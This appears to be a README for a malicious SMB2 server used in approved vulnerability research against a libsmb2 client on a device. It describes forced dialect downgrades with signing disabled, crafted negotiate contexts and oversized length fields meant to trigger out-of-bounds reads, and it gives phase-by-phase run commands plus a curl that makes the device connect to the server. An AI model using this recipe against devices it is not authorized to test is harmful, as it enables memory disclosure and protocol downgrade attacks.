# dropserver.py — nc0 single-pass device-run server (bead nc0 assist)

Replaces the SESSION_SETUP zeros-stub in WildPond's `negprobe.py` (which stays
untouched) with a complete malicious SMB2 chain so each device phase is one
server restart + one `/getaa` curl, and a harness failure can never look like
a client rejection.

## What it implements (libsmb2 v4.0.0, tag 2ef9bb7 client)

Full chain, every field explicit:

```
NEGOTIATE   dialect forced per --profile, security_mode=0, no signing
SESSION_SETUP  real NTLMSSP: type-1 -> CHALLENGE (STATUS_MORE_PROCESSING_
               REQUIRED, session id assigned), type-3 -> SUCCESS (id echoed)
TREE_CONNECT   share caps 0x1F, maximal access
CREATE         file handle, end-of-file 0x1000
QUERY_INFO     FILE_NAME_INFORMATION payload with --fnlen FileNameLength
               (the FileName over-read shape, surplus 'A' bytes appended)
READ           DataLength = --dlen (the READ DataLength surplus shape)
```

## Profiles (one per device-run phase, docs/RE_CVE_2026_4149.md)

| profile | NEGOTIATE answer | settles |
|---|---|---|
| `honest` | client's best offered dialect, honest 3.1.1 contexts | baseline: does the well-formed chain complete? |
| `force-210` | dialect 0x0210 | does SESSION_SETUP follow a 2.1 answer? (advisory premise) |
| `force-202` | dialect 0x0202 | the full downgrade: 2.0.2, no preauth hash, signing off |
| `ctx-311` | 3.1.1 with NegotiateContextCount=4 and context offset 0xFF00 (beyond the iov) | the `smb2_parse_negotiate_contexts` stale-type/len OOB-read candidate (doc §5) |

Reply byte layout verified against MS-SMB2: NEGOTIATE response field order
`StructureSize, SecurityMode, DialectRevision, NegotiateContextCount,
ServerGuid, Capabilities, Max{Transaction,Read,Write}, SystemTime,
ServerStartTime, SecurityBufferOffset/Length, NegotiateContextOffset` —
libsmb2 reads the dialect at reply-payload offset 4 (abs 68). SESSION_SETUP
request SecurityBufferOffset/Length parsed at fixed-part offsets 12/14
(abs 76/78) per MS-SMB2 2.2.5 (`StructureSize u16, Flags u8, SecurityMode u8,
Capabilities u32, Channel u32, SecBufOff u16, SecBufLen u16, PrevSessionId
u64`).

## Verification (offline, no device)

`python3` self-tests run in-repo:
- per-profile NEGOTIATE field assertions (dialect/secmode/ctxcount/tail-offset)
- full loopback chain through the NetBIOS framing: dialect=2.0.2, session id
  assigned at CHALLENGE and echoed at AUTH, TREE_CONNECT/CREATE/QUERY_INFO/READ
  all answered, `fnlen`/`dlen` round-trip.

## Device-run recipe (for WildPond's approved run)

```
# phase 1 (observe offer)
python3 recon/smb4149/dropserver.py 4450 --profile honest --log drop.log
# phase 2 (downgrade premise)
python3 recon/smb4149/dropserver.py 4450 --profile force-210 --log drop.log
python3 recon/smb4149/dropserver.py 4450 --profile force-202 --log drop.log
# phase 3 (over-read shapes through the downgraded session)
python3 recon/smb4149/dropserver.py 4450 --profile force-202 --fnlen 4111 --dlen 65536 --log drop.log
# each phase: curl 'http://<.86>:1400/getaa?u=x-file-cifs://<host>:4450/S/f.jpg'
```

The server log records the offered dialect list, the forced answer, every
command with mid/sid/tid, and NTLM message types — the phase-2 question
("did SESSION_SETUP follow a sub-3.1.1 answer?") is answered by two log lines,
no interpretation.
